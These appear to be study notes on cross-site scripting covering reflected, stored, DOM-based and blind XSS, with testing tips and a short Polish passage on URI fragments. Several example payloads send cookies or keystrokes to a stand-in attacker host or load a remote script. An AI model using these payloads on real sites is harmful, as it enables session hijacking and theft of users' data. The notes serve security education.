# Cross-Site Scripting (XSS)
Cross-Site Scripting (XSS) is an injection attack where malicious JavaScript is injected into a web application to be executed by other users.  

## XSS payload
In XSS, a payload is the JavaScript code intended to execute on a target's device. A payload consists of two parts: **the intention (what the code does)** and **the modification (adapting the code to execute in specific scenarios)**.  
Examples of payload intentions include:

**Proof of Concept**:  
Demonstrating XSS by triggering a simple action, like an alert box.  
Example: `<script>alert('XSS');</script>`  

**Session Stealing**:  
Extracting and sending a user's session cookies to the attacker, allowing session hijacking.  
Example: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>`  

**Key Logger**:  
Logging keystrokes and sending them to the attacker’s server.  
Example: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key));}</script>` 

**Business Logic**:  
Exploiting specific functions, like changing a user's email to an attacker's address.  
Example: `<script>user.changeEmail('attacker@hacker.thm');</script>`  
___
## Reflected XSS
**Reflected XSS** occurs when user-supplied data in an HTTP request is included in a webpage's source code without proper validation.
Example:  
A website that displays error messages directly from the query string without checking its content.  
`https://website.com/?error=Invalid Input Dettected`
```
<div class="alert alert-danger">
    <p>Invalid Input Detected</p>
</div>
```
`https://website.com/?error=<script src=<script src="https://attacker.thm/evil.js"></script>`
```
<div class="alert alert-danger">
    <p><script src="https://attacker.thm/evil.js"></script></p>
</div>
```
Attackers can send malicious links or embed them in iframes to execute JavaScript in victims' browsers, potentially stealing session data or sensitive information.  

Testing for Reflected XSS:  
Test all potential entry points:  
- URL query parameters
- URL file paths
- (Occasionally) HTTP headers
Identify reflected data and verify if a JavaScript payload can execute.  
Payload success depends on where the code is reflected in the application.  
___
## Stored XSS
**Stored XSS** involves storing the malicious payload (e.g., in a database) on the web application. The payload is executed when other users visit the affected page.  

Example:  
A blog website allows users to post comments but doesn't filter out malicious JavaScript. A comment with JavaScript gets stored in the database, and every visitor triggers the script in their browser.  

Potential Impact:  
- Redirecting users to malicious sites.  
- Stealing session cookies.  
- Performing actions on the site as the affected user.  

Testing for Stored XSS:  
Identify entry points where user data is stored and displayed to others:  
- Blog comments.  
- User profile fields.  
- Website listings.  
- Bypass client-side protections by manipulating requests (e.g., sending unexpected data like JavaScript instead of an integer in an input field).  

- Confirm if your JavaScript payload executes, considering where it is reflected in the application.
___
## DOM Based XSS
The **DOM (Document Object Model)** is a programming interface for HTML and XML documents that allows the structure, style, and content of a webpage to be modified programmatically.  



**DOM-Based XSS** occurs when JavaScript in the browser executes malicious input directly, without involving backend interactions or page reloads.  
DOM-based XSS occurs entirely within the user's browser, without involving server-side processing. It manipulates the browser’s Document Object Model (DOM) to execute malicious scripts, making it harder to detect and exploit due to modern browser security improvements.
How DOM-Based XSS Works:  
- Attackers inject malicious code into client-side scripts (e.g., via URL parameters).  
- The browser processes and executes the payload without server involvement.  


**DOM-Based XSS** polegają na wstrzyknięciu złośliwego JavaScriptu do strony internetowej poprzez fragment URI.  
Adres URL:  
```
https://hacksplaining.com/glossary/urls?ref=google&top=Y#details
|    |                  |              |                |      |
  |          |                 |                |          |
  |        domena            ścieżka            |      fragment URI
protokół                                   ciąg zapytania

```
Fragment URI jest opcjonalną częścią adresu URL, znajdującą się za znakiem `#`. Przeglądarki wykorzystują fragmenty URI do wewnętrznej nawigacji po stronie - jeśli na stronie znajduje się znacznik HTML-a, którego atrybut id pasuje do fragmentu URI, przeglądarka po wyświetleniu strony przewinie jej treść do tego znacznika.  
Umożłiwia to odwoływanie się bezpośrednio doróżnych sekcji na stroie.
Example:  
A website uses window.location.hash to display content on the page. If the hash's content isn’t validated, attackers can inject JavaScript, which runs in the victim’s browser.

Potential Impact:  
- Redirecting users to malicious websites.  
- Stealing session data or sensitive content from the page.  

Testing for Stored XSS:  
- Analyze the JavaScript source code for controllable variables (e.g., window.location.x parameters).  
- Check if these variables are written to the DOM or used in unsafe methods like eval().  
- Use crafted payloads to confirm if malicious JavaScript can execute.  
___
## Blind XSS
**Blind XSS** is similar to Stored XSS, but the attacker cannot see the payload execution or test it directly.  
Example:  
A website's contact form accepts messages that are converted into support tickets for staff. If the form doesn't validate inputs, an attacker can inject malicious JavaScript, which staff unknowingly execute in their private portal.  

Potential Impact:  
- Reveal the staff portal URL.  
- Capture staff members' cookies.  
- Extract contents of the portal page. This could allow session hijacking and access to the private portal.  

Testing for Blind XSS:  
- Ensure your payload includes a callback (e.g., an HTTP request) to confirm execution.  
- Tools like [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) can automatically capture details such as cookies, URLs, and page content, simplifying detection and exploitation.
___
## Sources
- tryhackme, Intro to Cross-site Scripting, https://tryhackme.com/r/room/xss.
- tryhackme, XSS, https://tryhackme.com/r/room/axss.  
- M. McDonald, Bezpieczeństwo Aplikacji Internetowych dla Programistów, 2021 Helion S.A.  